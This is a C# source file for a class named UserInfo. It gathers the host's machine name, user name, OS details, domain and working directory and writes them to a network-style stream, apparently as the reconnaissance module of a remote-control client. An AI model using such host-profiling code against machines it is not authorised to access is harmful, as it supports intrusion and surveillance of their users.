using Protocol;
using System.IO;
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;

namespace Client3
{
    class UserInfo
    {
        private int _count { get; set; } = 0;
        private string machineName { get; set; }

        private string userName { get; set; }

        private string osVersion { get; set; }

        private string processorCount { get; set; }

        private string sysDirectory { get; set; }

        private string domainName { get; set; }

        private string cwd { get; set; }

        private string framework { get; set; }

        private string osDec { get; set; }

        public void GetInfo(Stream stream)
        {
            try
            {
                machineName = Environment.MachineName;
                _count++;
                
                userName = Environment.UserName;
                _count++;

                osVersion = Environment.OSVersion.ToString();
                _count++;

                processorCount = Environment.ProcessorCount.ToString();
                _count++;

                sysDirectory = Environment.SystemDirectory;
                _count++;

                domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
                _count++;

                cwd = Environment.CurrentDirectory;
                _count++;

                framework = RuntimeInformation.FrameworkDescription;
                _count++;

                osDec = RuntimeInformation.OSDescription;
                _count++;

                
            }
            catch
            {
                _count--;
                
            }


            stream.WriteString(_count.ToString());
            stream.WriteString($"[~] Machine name: {machineName}\n");
            stream.WriteString($"[~] User name: {userName}\n");
            stream.WriteString($"[~] Os version: {osVersion}\n");
            stream.WriteString($"[~] Processor count: {processorCount}\n");
            stream.WriteString($"[~] System directory: {sysDirectory}\n");
            stream.WriteString($"[~] Domain name: {domainName}\n");
            stream.WriteString($"[~] Current working directory: {cwd}\n");
            stream.WriteString($"[~] Framework description: {framework}\n");
            stream.WriteString($"[~] Os description: {osDec}\n");
        }
    }
}
